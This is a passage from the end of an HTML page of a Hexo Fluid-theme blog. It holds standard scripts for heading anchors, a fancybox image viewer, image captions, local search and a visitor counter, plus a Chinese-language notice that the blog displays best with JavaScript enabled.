    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
